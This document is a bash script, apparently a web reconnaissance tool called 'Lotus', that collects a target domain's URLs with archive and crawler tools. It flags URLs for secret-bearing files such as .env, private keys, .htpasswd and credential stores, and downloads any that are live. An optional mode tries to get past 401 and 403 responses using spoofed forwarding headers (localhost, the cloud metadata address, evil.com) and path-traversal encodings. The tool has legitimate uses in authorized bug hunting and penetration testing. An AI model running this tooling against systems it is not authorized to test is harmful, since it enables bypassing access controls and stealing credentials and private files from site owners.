#!/bin/bash

set -u
trap 'echo -e "\n[!] Script interrupted. Exiting."; kill $(jobs -p) 2>/dev/null; exit 1' INT

# ==================== ASCII BANNER (Soft pastel pink) ====================
LOTUS_COLOR='\033[38;5;211m'   # soft pastel pink
RESET='\033[0m'

echo -e "${LOTUS_COLOR}"
cat << "EOF"
██╗      ██████╗ ████████╗██╗   ██╗███████╗
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝
██║     ██║   ██║   ██║   ██║   ██║███████╗
██║     ██║   ██║   ██║   ██║   ██║╚════██║
███████╗╚██████╔╝   ██║   ╚██████╔╝███████║
╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝
EOF
echo -e "${RESET}by 0xmicho\n"

# ==================== CONFIGURATION ====================
# Tool commands (all verified during pre-flight)
GAUPLUS="gauplus"
WAYBACKURLS="waybackurls"
WAYMORE="waymore"
KATANA="katana"
GOSPIDER="gospider"
HAKRAWLER="hakrawler"
HTTPX="httpx"
URO="uro"
WGET="wget"
CURL="curl"

# Massive list of sensitive extensions
SENSITIVE_EXTS="zip|rar|7z|tar|gz|tgz|bz2|xz|zst|bak|backup|old|orig|copy|swp|swo|tmp|temp|log|txt|conf|config|cfg|ini|inf|yml|yaml|json|xml|sql|db|sqlite|sqlite3|mdb|accdb|dbf|dump|csv|tsv|xls|xlsx|xlsm|ods|doc|docx|dot|odt|pdf|rtf|ps1|sh|bat|cmd|vbs|psm1|psd1|key|crt|csr|pem|p12|pfx|der|jks|keystore|ovpn|git|svn|hg|idea|vscode|sublime-workspace|env|env.local|env.dev|env.prod|htaccess|htpasswd|passwd|shadow|master.passwd|sudoers|id_rsa|id_dsa|id_ecdsa|id_ed25519|github_token|gitlab_token|npmrc|yarnrc|composer.json|composer.lock|package.json|package-lock.json|go.mod|go.sum|pom.xml|build.gradle|settings.gradle|gradle.properties|docker-compose.yml|Dockerfile|Makefile|Vagrantfile|terraform.tf|terraform.tfvars|credentials|secrets|secret_key_base|master.key|storage.yml|database.yml|config.yml|application.properties|bootstrap.properties|application.conf|routes|web.config|robots.txt|sitemap.xml|crossdomain.xml|client_secret.json|service_account.json|*.p8|*.mobileprovision|*.plist|*.dmg|*.pkg|*.exe|*.msi|*.bin|*.img|*.iso|*.vmdk|*.qcow2|*.ova|*.ovf|*.backup|*.bacpac|*.dacpac|*.mdf|*.ldf|*.frm|*.myd|*.myi|*.ibd|*.ibdata1|*.redo|*.undo|*.trc|*.sqllog|*.ldif|*.kdbx|*.kdb|*.psafe3|*.agilekeychain|*.keychain|*.ppk|*.pcap|*.pcapng|*.har|*.br|*.brotli|*.gz|*.xz|*.lz4|*.snappy|*.zstd|*.cap|*.hccapx|*.22000"

# Massive list of juicy directory/file names
JUICY_WORDS="admin|administrator|api|rest|graphql|graphiql|swagger|swagger-ui|swagger.json|swagger.yaml|openapi.json|docs|documentation|redoc|v1|v2|v3|v4|beta|alpha|test|testing|dev|development|stage|staging|prod|production|sandbox|uat|demo|internal|private|public|secure|auth|login|signin|signup|register|user|users|profile|account|dashboard|panel|console|portal|cpanel|phpmyadmin|phppgadmin|adminer|mysql|pma|webmail|mail|roundcube|squirrelmail|zimbra|exchange|owa|ews|activesync|autodiscover|rpc|ews|ecp|owa|mapi|powerbi|grafana|prometheus|kibana|elasticsearch|logstash|jenkins|gitlab|github|bitbucket|jira|confluence|sonarqube|nexus|artifactory|harbor|docker|registry|kubernetes|k8s|openshift|rancher|nomad|consul|vault|traefik|nginx|apache|tomcat|jboss|wildfly|websphere|weblogic|payara|glassfish|jetty|netty|undertow|node|express|flask|django|rails|laravel|symfony|yii|cakephp|codeigniter|zend|spring|struts|hibernate|mybatis|phpinfo|info|status|health|metrics|debug|trace|monitor|actuator|env|heapdump|threaddump|threads|conditions|configprops|mappings|shutdown|restart|pause|resume|refresh|bus-refresh|bus-env|service-registry|eureka|consul|zookeeper|etcd|skywalking|zipkin|jaeger|opentelemetry|fluentd|logstash|filebeat|metricbeat|heartbeat|packetbeat|auditbeat|functionbeat|winlogbeat|kafka|zookeeper|rabbitmq|activemq|artemis|pulsar|rocketmq|redis|memcached|couchbase|mongodb|elasticsearch|solr|sphinx|meilisearch|typesense|algolia|azure|aws|s3|bucket|cloudfront|lambda|ec2|rds|dynamodb|redshift|kms|secretsmanager|ssm|parameterstore|cloudwatch|eventbridge|sns|sqs|stepfunctions|glue|emr|data pipeline|databricks|snowflake|bigquery|pubsub|firebase|gcp|googlecloud|appengine|compute|storage|sql|spanner|bigtable|datastore|firestore|functions|run|cloudrun|gae|gke|aks|eks|fargate|serverless|openfaas|openwhisk|kubeless|fn|fission|knative|tekton|argo|flux|jenkinsx|spinnaker|drone|circleci|travisci|githubactions|gitlabci|azuredevops|teamcity|bamboo|buddy|codeship|wercker|concourse|buildkite|semaphore|bitrise|appcenter|fastlane|jenkins|bamboo|teamcity|octopus|ansible|chef|puppet|salt|terraform|packer|vagrant|cloudformation|arm|bicep|pulumi|crossplane|kustomize|helm|kpt|kubectl|oc|istio|linkerd|consul|envoy|nginx|haproxy|traefik|caddy|varnish|squid|apache|httpd|lighttpd|iis"

THREADS=20
DEPTH=3
HEADLESS=false
RUN_BYPASS=false
INPUT_FILE=""
DOMAINS=()
BASEDIR=$(pwd)

RATE_LIMIT=20

REQUIRED_TOOLS=(
    "$GAUPLUS"
    "$WAYBACKURLS"
    "$WAYMORE"
    "$KATANA"
    "$GOSPIDER"
    "$HAKRAWLER"
    "$HTTPX"
    "$URO"
    "$WGET"
    "$CURL"
)

# ==================== PRE-FLIGHT TOOL CHECK ====================
missing_tools=()
for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
        missing_tools+=("$tool")
    fi
done

if [ ${#missing_tools[@]} -ne 0 ]; then
    echo -e "[!] Missing required tools: ${missing_tools[*]}"
    echo "Please install them and try again."
    exit 1
fi

# ==================== HELP ====================
usage() {
    echo "Usage:"
    echo "  Single domain: $0 [-d depth] [-t threads] [--headless] [--bypass] domain.com"
    echo "  List of domains: $0 -l domains.txt [-d depth] [-t threads] [--headless] [--bypass]"
    echo "Options:"
    echo "  -d INT      Crawling depth (default: 3)"
    echo "  -t INT      Number of threads/concurrency (default: 20)"
    echo "  --headless  Enable katana headless crawling (experimental)"
    echo "  --bypass    Run heavy 403/401 bypass tests (may take a long time)"
    echo "  -l FILE     Input file with domains (one per line)"
    echo "  -h          Show this help"
    exit 0
}

# ==================== PARSE ARGUMENTS ====================
while [[ $# -gt 0 ]]; do
    case $1 in
        -d) DEPTH="$2"; shift 2 ;;
        -t) THREADS="$2"; shift 2 ;;
        --headless) HEADLESS=true; shift ;;
        --bypass) RUN_BYPASS=true; shift ;;
        -l) INPUT_FILE="$2"; shift 2 ;;
        -h) usage ;;
        *)  DOMAINS+=("$1"); shift ;;
    esac
done

if [ -n "$INPUT_FILE" ]; then
    if [ ! -f "$INPUT_FILE" ]; then
        echo "[!] Input file not found: $INPUT_FILE"
        exit 1
    fi
    mapfile -t DOMAINS < "$INPUT_FILE"
fi

if [ ${#DOMAINS[@]} -eq 0 ]; then
    read -r -p "Enter domain: " input
    [ -z "$input" ] && usage
    DOMAINS=("$input")
fi

MAIN_OUTDIR="$BASEDIR/lotus_result"
mkdir -p "$MAIN_OUTDIR"

# ==================== HELPER FUNCTIONS ====================
extract_base() {
    local raw="$1"
    raw=$(echo "$raw" | sed -E 's#^https?://##')
    raw=$(echo "$raw" | sed -E 's#[/:].*$##')
    echo "$raw"
}

sanitize_name() {
    local d="$1"
    d=$(echo "$d" | sed -E 's#^https?://##' | sed -E 's#/*$##' | sed -E 's#[:/]#_#g')
    echo "$d"
}

ensure_url() {
    local d="$1"
    if [[ "$d" =~ ^https?:// ]]; then
        echo "$d"
    else
        echo "https://$d"
    fi
}

is_ip_target() {
    local d="$1"
    d=$(echo "$d" | sed -E 's#^https?://##')
    [[ "$d" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(:[0-9]+)?$ ]]
}

filter_scope() {
    local base="$1"
    local infile="$2"
    local outfile="$3"
    base_regex=$(echo "$base" | sed 's/\./\\./g')
    grep -E "https?://([a-zA-Z0-9.-]*\.)?${base_regex}(:|\$|/)" "$infile" > "$outfile" 2>/dev/null || true
}

# Enhanced bypass function with extensive techniques and logging
# Arguments: url, output_directory, forbidden_file (to append on failure)
test_bypass() {
    local url="$1"
    local outdir="$2"
    local forbidden_file="$3"
    local base_name=$(echo "$url" | sed -E 's#https?://##g' | tr '/?&' '_')

    # Headers with placeholder __BASE_DOMAIN__ (replaced later)
    declare -a headers=(
        "X-Forwarded-For:127.0.0.1"
        "X-Forwarded-For:localhost"
        "X-Forwarded-Host:localhost"
        "X-Forwarded-Host:127.0.0.1"
        "X-Forwarded-Server:localhost"
        "X-Forwarded-Server:127.0.0.1"
        "X-Real-IP:127.0.0.1"
        "X-Original-URL:/"
        "X-Rewrite-URL:/"
        "X-Custom-IP-Authorization:127.0.0.1"
        "X-Originating-IP:127.0.0.1"
        "X-Remote-IP:127.0.0.1"
        "X-Remote-Addr:127.0.0.1"
        "X-Client-IP:127.0.0.1"
        "X-Host:127.0.0.1"
        "X-Forwarded-For:127.0.0.1, 127.0.0.2"
        "X-Forwarded-For:192.168.1.1"
        "X-Forwarded-Host:192.168.1.1"
        "X-Real-IP:192.168.1.1"
        "X-Originating-IP:192.168.1.1"
        "X-Remote-IP:192.168.1.1"
        "X-Remote-Addr:192.168.1.1"
        "X-Client-IP:192.168.1.1"
        "X-Host:192.168.1.1"
        "X-Forwarded-For:10.0.0.1"
        "X-Forwarded-Host:10.0.0.1"
        "X-Real-IP:10.0.0.1"
        "X-Originating-IP:10.0.0.1"
        "X-Remote-IP:10.0.0.1"
        "X-Remote-Addr:10.0.0.1"
        "X-Client-IP:10.0.0.1"
        "X-Host:10.0.0.1"
        "X-Forwarded-For:169.254.169.254"
        "X-Forwarded-Host:169.254.169.254"
        "X-Real-IP:169.254.169.254"
        "X-Originating-IP:169.254.169.254"
        "X-Remote-IP:169.254.169.254"
        "X-Remote-Addr:169.254.169.254"
        "X-Client-IP:169.254.169.254"
        "X-Host:169.254.169.254"
        "X-Forwarded-For:127.0.0.1:80"
        "X-Forwarded-Host:127.0.0.1:80"
        "X-Real-IP:127.0.0.1:80"
        "X-Originating-IP:127.0.0.1:80"
        "X-Remote-IP:127.0.0.1:80"
        "X-Remote-Addr:127.0.0.1:80"
        "X-Client-IP:127.0.0.1:80"
        "X-Host:127.0.0.1:80"
        "X-Forwarded-Proto:http"
        "X-Forwarded-Proto:https"
        "X-Forwarded-Scheme:http"
        "X-Forwarded-Scheme:https"
        "X-Url-Scheme:http"
        "X-Url-Scheme:https"
        "X-Forwarded-SSL:on"
        "X-Forwarded-SSL:off"
        "X-Forwarded-Protocol:http"
        "X-Forwarded-Protocol:https"
        "X-Real-Scheme:http"
        "X-Real-Scheme:https"
        "X-Real-Proto:http"
        "X-Real-Proto:https"
        "X-Real-SSL:on"
        "X-Real-SSL:off"
        "X-Original-Method:GET"
        "X-Original-Method:POST"
        "X-HTTP-Method-Override:GET"
        "X-HTTP-Method-Override:POST"
        "X-HTTP-Method-Override:HEAD"
        "X-Method-Override:GET"
        "X-Method-Override:POST"
        "X-Method-Override:HEAD"
        "X-HTTP-Method:GET"
        "X-HTTP-Method:POST"
        "X-HTTP-Method:HEAD"
        "X-Method:GET"
        "X-Method:POST"
        "X-Method:HEAD"
        "X-Original-URL:/"
        "X-Rewrite-URL:/"
        "X-Custom-IP-Authorization:127.0.0.1"
        "X-Custom-IP-Authorization:localhost"
        "X-Custom-IP-Authorization:169.254.169.254"
        "X-Custom-IP-Authorization:192.168.1.1"
        "X-Custom-IP-Authorization:10.0.0.1"
        "X-Originating-URL:/"
        "X-Rewritten-URL:/"
        "X-Forwarded-For:evil.com"
        "X-Forwarded-Host:evil.com"
        "X-Real-IP:evil.com"
        "X-Originating-IP:evil.com"
        "X-Remote-IP:evil.com"
        "X-Remote-Addr:evil.com"
        "X-Client-IP:evil.com"
        "X-Host:evil.com"
        "Referer:https://www.google.com/"
        "Referer:https://www.facebook.com/"
        "Referer:https://www.example.com/"
        "Referer:http://localhost/"
        "Referer:http://127.0.0.1/"
        "Referer:https://__BASE_DOMAIN__/"
        "Origin:https://__BASE_DOMAIN__"
        "Origin:http://localhost"
        "Origin:null"
    )

    declare -a path_tricks=(
        ""
        "/%2e/"
        "/%252e/"
        "/%2e%2e/"
        "/%252e%252e/"
        "/..;/"
        "/;/"
        "/./"
        "/%2e%2e%2f"
        "/..%252f"
        "/%2e%2e%5c"
        "/..%255c"
        "/../"
        "/..%2f"
        "/..%252f"
        "/%2e%2e/"
        "/%2e%2e%2f"
        "/%252e%252e%252f"
        "/.%2e/"
        "/.%252e/"
        "/..%5c"
        "/..%255c"
        "/..%c0%af"
        "/..%c0%9v"
        "/%c0%ae%c0%ae/"
        "/%c0%ae%c0%ae%c0%af"
        "/%c0%ae%c0%ae%c0%5c"
        "/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af"
        "/..;/"
        "/..%3b/"
        "/..%253b/"
        "/..;/../"
        "/..;/./"
        "/..;/..;/"
        "/;/..;/"
        "/..%252f%252e%252e%252f"
        "/..%2f%2e%2e%2f"
        "/%2e%2e%2f%2e%2e%2f"
        "/%2e%2e%5c%2e%2e%5c"
        "/..;/..;/..;/"
        "/..;/..;/..;/..;/"
        "/..;/..;/..;/..;/..;/"
        "/../%2e%2e%2f"
        "/../%2e%2e%5c"
        "/%2e%2e/%2e%2e/"
        "/%2e%2e%2f%2e%2e%2f"
        "/%2e%2e%5c%2e%2e%5c"
        "/..;/..;/..;/..;/..;/..;/"
        "/.html"
        "/.php"
        "/.asp"
        "/.aspx"
        "/.jsp"
        "/.do"
        "/.action"
        "/.json"
        "/.xml"
        "/.txt"
        "/.pdf"
        "/.doc"
        "/.xls"
        "/.ppt"
        "/.zip"
        "/.rar"
        "/.7z"
        "/.tar"
        "/.gz"
        "/.tgz"
        "/.bz2"
        "/.xz"
        "/.zst"
        "/.bak"
        "/.old"
        "/.orig"
        "/.copy"
        "/.swp"
        "/.swo"
        "/.tmp"
        "/.temp"
        "/.log"
        "/.conf"
        "/.config"
        "/.cfg"
        "/.ini"
        "/.inf"
        "/.yml"
        "/.yaml"
        "/.json"
        "/.xml"
        "/.sql"
        "/.db"
        "/.sqlite"
        "/.sqlite3"
        "/.mdb"
        "/.accdb"
        "/.dbf"
        "/.dump"
        "/.csv"
        "/.tsv"
        "/.xls"
        "/.xlsx"
        "/.xlsm"
        "/.ods"
        "/.doc"
        "/.docx"
        "/.dot"
        "/.odt"
        "/.pdf"
        "/.rtf"
        "/.ps1"
        "/.sh"
        "/.bat"
        "/.cmd"
        "/.vbs"
        "/.psm1"
        "/.psd1"
        "/.key"
        "/.crt"
        "/.csr"
        "/.pem"
        "/.p12"
        "/.pfx"
        "/.der"
        "/.jks"
        "/.keystore"
        "/.ovpn"
        "/.git"
        "/.svn"
        "/.hg"
        "/.idea"
        "/.vscode"
        "/.sublime-workspace"
        "/.env"
        "/.env.local"
        "/.env.dev"
        "/.env.prod"
        "/.htaccess"
        "/.htpasswd"
        "/.passwd"
        "/.shadow"
        "/.master.passwd"
        "/.sudoers"
        "/.id_rsa"
        "/.id_dsa"
        "/.id_ecdsa"
        "/.id_ed25519"
        "/.github_token"
        "/.gitlab_token"
        "/.npmrc"
        "/.yarnrc"
        "/.composer.json"
        "/.composer.lock"
        "/.package.json"
        "/.package-lock.json"
        "/.go.mod"
        "/.go.sum"
        "/.pom.xml"
        "/.build.gradle"
        "/.settings.gradle"
        "/.gradle.properties"
        "/.docker-compose.yml"
        "/.Dockerfile"
        "/.Makefile"
        "/.Vagrantfile"
        "/.terraform.tf"
        "/.terraform.tfvars"
        "/.credentials"
        "/.secrets"
        "/.secret_key_base"
        "/.master.key"
        "/.storage.yml"
        "/.database.yml"
        "/.config.yml"
        "/.application.properties"
        "/.bootstrap.properties"
        "/.application.conf"
        "/.routes"
        "/.web.config"
        "/.robots.txt"
        "/.sitemap.xml"
        "/.crossdomain.xml"
        "/.client_secret.json"
        "/.service_account.json"
        "/.p8"
        "/.mobileprovision"
        "/.plist"
        "/.dmg"
        "/.pkg"
        "/.exe"
        "/.msi"
        "/.bin"
        "/.img"
        "/.iso"
        "/.vmdk"
        "/.qcow2"
        "/.ova"
        "/.ovf"
        "/.backup"
        "/.bacpac"
        "/.dacpac"
        "/.mdf"
        "/.ldf"
        "/.frm"
        "/.myd"
        "/.myi"
        "/.ibd"
        "/.ibdata1"
        "/.redo"
        "/.undo"
        "/.trc"
        "/.sqllog"
        "/.ldif"
        "/.kdbx"
        "/.kdb"
        "/.psafe3"
        "/.agilekeychain"
        "/.keychain"
        "/.ppk"
        "/.pcap"
        "/.pcapng"
        "/.har"
        "/.br"
        "/.brotli"
        "/.lz4"
        "/.snappy"
        "/.zstd"
        "/.cap"
        "/.hccapx"
        "/.22000"
    )

    local success_file="$outdir/bypass_success.txt"
    local found=false

    log_success() {
        local technique="$1"
        echo "$url | $technique" >> "$success_file"
        echo "   ✅ Bypass successful: $technique"
        found=true
    }

    # Test header variations (replace __BASE_DOMAIN__ with actual base)
    for header in "${headers[@]}"; do
        header_expanded=$(echo "$header" | sed "s/__BASE_DOMAIN__/$BASE_DOMAIN/g")
        status=$($CURL -k -s -o /dev/null -w "%{http_code}" -H "$header_expanded" "$url" 2>/dev/null)
        if [ "$status" = "200" ]; then
            log_success "Header: $header_expanded"
        fi
    done

    # Test path tricks
    if [[ "$url" =~ ^(https?://[^/]+)(/.*)?$ ]]; then
        base="${BASH_REMATCH[1]}"
        path="${BASH_REMATCH[2]:-}"
        for trick in "${path_tricks[@]}"; do
            if [ -n "$trick" ]; then
                test_url="${base}${trick}${path}"
            else
                test_url="$url"
            fi
            status=$($CURL -k -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)
            if [ "$status" = "200" ]; then
                log_success "Path trick: $trick → $test_url"
            fi
        done
    fi

    if [ "$found" = false ]; then
        echo "$url" >> "$forbidden_file"
        echo "   ❌ No bypass found for $url (appended to $forbidden_file)"
    fi
}

cleanup_domain_folder() {
    local folder="$1"
    local base_domain="$2"
    cd "$folder" || return

    find . -maxdepth 1 -type f -name "*.txt" -size 0 -delete

    for file in *.txt; do
        [ -f "$file" ] || continue
        lines=$(wc -l < "$file" 2>/dev/null || echo 0)
        if [ "$lines" -le 100 ] && [ "$lines" -gt 0 ]; then
            tmpfile=$(mktemp)
            while IFS= read -r url; do
                if [[ "$url" =~ ^https?://([^/:]+)(:[0-9]+)?(/.*)?$ ]]; then
                    host="${BASH_REMATCH[1]}"
                    port="${BASH_REMATCH[2]}"
                    path="${BASH_REMATCH[3]}"
                    if [ "$host" = "$base_domain" ] && [ -z "$port" ] && { [ -z "$path" ] || [ "$path" = "/" ]; }; then
                        continue
                    fi
                fi
                echo "$url" >> "$tmpfile"
            done < "$file"
            mv "$tmpfile" "$file"
        fi
    done

    cd - >/dev/null
}

# ==================== MAIN LOOP ====================
for RAW_DOMAIN in "${DOMAINS[@]}"; do
    [ -z "$RAW_DOMAIN" ] && continue

    echo "=========================================="
    echo " 🪷  Lotus - Target: $RAW_DOMAIN"
    echo "=========================================="

    SAFE_NAME=$(sanitize_name "$RAW_DOMAIN")
    OUTDIR="$MAIN_OUTDIR/$SAFE_NAME"
    mkdir -p "$OUTDIR"
    cd "$OUTDIR"

    TARGET_URL=$(ensure_url "$RAW_DOMAIN")
    BASE_DOMAIN=$(extract_base "$RAW_DOMAIN")
    export BASE_DOMAIN  # for use in bypass function

    # ---------- PASSIVE RECON ----------
    echo "[+] 🌐 Passive Recon..."

    if is_ip_target "$RAW_DOMAIN"; then
        echo "   [!] Skipping passive (IP target)."
        touch gau.txt wayback.txt waymore.txt hakrawler_passive.txt
    else
        # gauplus
        echo "[+] gauplus running..."
        $GAUPLUS -t "$THREADS" -random-agent -subs "$RAW_DOMAIN" > gau.txt 2>/dev/null &
        PID_GAU=$!
        # waybackurls
        echo "[+] waybackurls running..."
        $WAYBACKURLS "$RAW_DOMAIN" > wayback.txt 2>/dev/null &
        PID_WB=$!
        # waymore
        echo "[+] waymore running..."
        $WAYMORE -i "$RAW_DOMAIN" -mode U -oU waymore.txt &>/dev/null &
        PID_WM=$!
        # hakrawler passive
        echo "[+] hakrawler (passive) running..."
        echo "$TARGET_URL" | $HAKRAWLER -plain -subs -depth 1 > hakrawler_passive.txt 2>/dev/null &
        PID_HK=$!

        wait $PID_GAU $PID_WB $PID_WM $PID_HK 2>/dev/null

        echo "[+] gauplus collected $(wc -l < gau.txt 2>/dev/null || echo 0) results."
        echo "[+] waybackurls collected $(wc -l < wayback.txt 2>/dev/null || echo 0) results."
        echo "[+] waymore collected $(wc -l < waymore.txt 2>/dev/null || echo 0) results."
        echo "[+] hakrawler (passive) collected $(wc -l < hakrawler_passive.txt 2>/dev/null || echo 0) results."
    fi

    # ---------- ACTIVE CRAWLING ----------
    echo "[+] ⚔️  Active crawling..."

    # Katana
    echo "[+] katana running..."
    KATANA_CMD="$KATANA -u $TARGET_URL -d $DEPTH -jc -kf all -c $THREADS -rl $RATE_LIMIT -silent -o katana.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'"
    if [ "$HEADLESS" = true ]; then
        KATANA_CMD="$KATANA_CMD -hl -sc"
    fi
    eval "$KATANA_CMD" 2>/dev/null &
    PID_KAT=$!

    # GoSpider
    echo "[+] gospider running..."
    $GOSPIDER -s "$TARGET_URL" -a --js -t "$THREADS" -d "$DEPTH" -o gospider_raw &>/dev/null &
    PID_GO=$!

    # hakrawler active
    echo "[+] hakrawler (active) running..."
    echo "$TARGET_URL" | $HAKRAWLER -plain -subs -depth "$DEPTH" -t "$THREADS" > hakrawler_active.txt 2>/dev/null &
    PID_HKA=$!

    wait $PID_KAT $PID_GO $PID_HKA 2>/dev/null

    echo "[+] katana collected $(wc -l < katana.txt 2>/dev/null || echo 0) results."

    # Process GoSpider output
    if [ -d gospider_raw ]; then
        cat gospider_raw/* 2>/dev/null | grep -Eo "https?://[^[:space:]\"]+" | sort -u > gospider.txt
        rm -rf gospider_raw
    else
        touch gospider.txt
    fi
    echo "[+] gospider collected $(wc -l < gospider.txt 2>/dev/null || echo 0) results."
    echo "[+] hakrawler (active) collected $(wc -l < hakrawler_active.txt 2>/dev/null || echo 0) results."

    # ---------- MERGE & SCOPE FILTER ----------
    echo "[+] 🧹 Merging and applying scope filter..."
    cat gau.txt wayback.txt waymore.txt gospider.txt katana.txt hakrawler_passive.txt hakrawler_active.txt 2>/dev/null | sort -u > all_urls_raw.txt
    TOTAL_RAW=$(wc -l < all_urls_raw.txt)
    filter_scope "$BASE_DOMAIN" all_urls_raw.txt all_urls_scoped.txt
    TOTAL_SCOPED=$(wc -l < all_urls_scoped.txt)
    echo "   🎯 URLs in scope: $TOTAL_SCOPED (out of $TOTAL_RAW raw)"

    echo "[+] uro cleaning..."
    $URO -i all_urls_scoped.txt -o all_urls.txt 2>/dev/null
    TOTAL_CLEAN=$(wc -l < all_urls.txt)
    echo "   🧼 After uro cleaning: $TOTAL_CLEAN"

    # ---------- SENSITIVE FILE HUNTING ----------
    echo "[+] 💣 Hunting sensitive files (extensions: ${SENSITIVE_EXTS//|/ })..."
    grep -Eio ".*\.($SENSITIVE_EXTS)(\?.*)?$" all_urls.txt | sort -u > sensitive_files_all.txt 2>/dev/null
    SENSITIVE_COUNT=$(wc -l < sensitive_files_all.txt)

    if [ "$SENSITIVE_COUNT" -gt 0 ]; then
        echo "   ⚠️  Found $SENSITIVE_COUNT URLs with sensitive extensions."
        echo "[+] httpx probing sensitive files..."
        $HTTPX -silent -insecure -mc 200,403,401 -l sensitive_files_all.txt -threads "$THREADS" -rl "$RATE_LIMIT" -random-agent -o sensitive_probed.txt 2>/dev/null
        grep ":200$" sensitive_probed.txt | sed 's/:200$//' > live_sensitive_files.txt
        grep -E ":40[13]$" sensitive_probed.txt | sed -E 's/:(40[13])$//' > sensitive_forbidden.txt
        LIVE_SENSITIVE=$(wc -l < live_sensitive_files.txt)

        if [ "$LIVE_SENSITIVE" -gt 0 ]; then
            echo "   🚨 $LIVE_SENSITIVE live sensitive files!"
            mkdir -p sensitive_downloads
            cd sensitive_downloads
            $WGET -i ../live_sensitive_files.txt -q --show-progress --timeout=10 --tries=2 --no-check-certificate 2>/dev/null
            cd ..
        else
            echo "   😔 No live (200) sensitive files."
        fi

        if [ -s sensitive_forbidden.txt ]; then
            if [ "$RUN_BYPASS" = true ]; then
                echo "   🔓 Testing bypass techniques on $(wc -l < sensitive_forbidden.txt) forbidden sensitive URLs..."
                mkdir -p bypass_sensitive
                touch bypass_sensitive/failures_temp.txt
                while IFS= read -r url; do
                    test_bypass "$url" "bypass_sensitive" "bypass_sensitive/failures_temp.txt"
                done < sensitive_forbidden.txt
                cat bypass_sensitive/failures_temp.txt >> sensitive_forbidden.txt
                sort -u -o sensitive_forbidden.txt sensitive_forbidden.txt
                rm bypass_sensitive/failures_temp.txt
            else
                echo "   ⏭️  Skipping bypass (use --bypass to enable)."
            fi
        fi
    else
        echo "   🤷 No sensitive extensions found."
    fi

    # ---------- JUICY PATH HUNTING (keywords) ----------
    echo "[+] 🔍 Hunting juicy paths (keywords: ${JUICY_WORDS//|/ })..."
    grep -Ei "($JUICY_WORDS)" all_urls.txt | grep -vE "\.($SENSITIVE_EXTS)(\?.*)?$" | sort -u > juicy_paths.txt 2>/dev/null
    JUICY_COUNT=$(wc -l < juicy_paths.txt)
    if [ "$JUICY_COUNT" -gt 0 ]; then
        echo "   🎯 Found $JUICY_COUNT juicy keyword URLs."
        echo "[+] httpx probing juicy paths..."
        $HTTPX -silent -insecure -mc 200,403,401 -l juicy_paths.txt -threads "$THREADS" -rl "$RATE_LIMIT" -random-agent -o juicy_probed.txt 2>/dev/null
        grep ":200$" juicy_probed.txt | sed 's/:200$//' > live_juicy_paths.txt
        grep -E ":40[13]$" juicy_probed.txt | sed -E 's/:(40[13])$//' > juicy_forbidden.txt
        LIVE_JUICY=$(wc -l < live_juicy_paths.txt)
        echo "   🔥 $LIVE_JUICY live juicy endpoints."

        if [ -s juicy_forbidden.txt ]; then
            if [ "$RUN_BYPASS" = true ]; then
                echo "   🔓 Testing bypass techniques on $(wc -l < juicy_forbidden.txt) forbidden juicy URLs..."
                mkdir -p bypass_juicy
                touch bypass_juicy/failures_temp.txt
                while IFS= read -r url; do
                    test_bypass "$url" "bypass_juicy" "bypass_juicy/failures_temp.txt"
                done < juicy_forbidden.txt
                cat bypass_juicy/failures_temp.txt >> juicy_forbidden.txt
                sort -u -o juicy_forbidden.txt juicy_forbidden.txt
                rm bypass_juicy/failures_temp.txt
            else
                echo "   ⏭️  Skipping bypass (use --bypass to enable)."
            fi
        fi
    else
        echo "   🤷 No juicy paths found."
    fi

    # ---------- JS FILES: ONLY DOWNLOAD, NO PARSING ----------
    echo "[+] 📜 Processing JavaScript files (download only, manual review)..."
    grep -i "\.js$" all_urls.txt | grep -ivE "\.json$|\.jsp$|\.js\.map$" | sort -u > js_files_all.txt 2>/dev/null
    JS_COUNT=$(wc -l < js_files_all.txt)

    if [ "$JS_COUNT" -gt 0 ]; then
        echo "   🟢 Checking live JS files..."
        $HTTPX -silent -insecure -mc 200 -l js_files_all.txt -threads "$THREADS" -rl "$RATE_LIMIT" -random-agent -o live_js.txt 2>/dev/null
        LIVE_JS=$(wc -l < live_js.txt)

        if [ "$LIVE_JS" -gt 0 ]; then
            echo "   📥 Downloading $LIVE_JS live JS files to 'js_downloads' (manual analysis)..."
            mkdir -p js_downloads
            cd js_downloads
            $WGET -i ../live_js.txt -q --show-progress --timeout=10 --tries=2 --no-check-certificate 2>/dev/null
            cd ..
        else
            echo "   ❌ No live JS files found."
        fi
    else
        echo "   ❌ No JS files found."
    fi

    # ---------- PARAMETER EXTRACTION ----------
    echo "[+] 🔧 Extracting all URL parameters for fuzzing..."
    grep -oP '[\?&]\K[^=]+' all_urls.txt 2>/dev/null | sort -u > parameters.txt
    PARA_COUNT=$(wc -l < parameters.txt)
    if [ "$PARA_COUNT" -gt 0 ]; then
        echo "   ✅ Found $PARA_COUNT unique parameter names."
    else
        echo "   🤷 No parameters found."
    fi

    # ---------- POST-SCAN CLEANUP ----------
    cleanup_domain_folder "$OUTDIR" "$BASE_DOMAIN"

    # ---------- FINAL SUMMARY ----------
    echo "=========================================="
    echo " 🏁 Mission Complete for $RAW_DOMAIN"
    echo " 📂 Output directory: $OUTDIR"
    echo "    - all_urls.txt: $TOTAL_CLEAN cleaned URLs"
    echo "    - live_sensitive_files.txt: $(wc -l < live_sensitive_files.txt 2>/dev/null || echo 0)"
    if [ -s sensitive_forbidden.txt ]; then
        echo "    - sensitive_forbidden.txt: $(wc -l < sensitive_forbidden.txt) (bypass tests in bypass_sensitive/)"
    fi
    echo "    - live_juicy_paths.txt: $(wc -l < live_juicy_paths.txt 2>/dev/null || echo 0)"
    if [ -s juicy_forbidden.txt ]; then
        echo "    - juicy_forbidden.txt: $(wc -l < juicy_forbidden.txt) (bypass tests in bypass_juicy/)"
    fi
    echo "    - live_js.txt: $(wc -l < live_js.txt 2>/dev/null || echo 0)"
    echo "    - parameters.txt: $(wc -l < parameters.txt 2>/dev/null || echo 0)"
    echo "=========================================="

    cd "$BASEDIR"
done
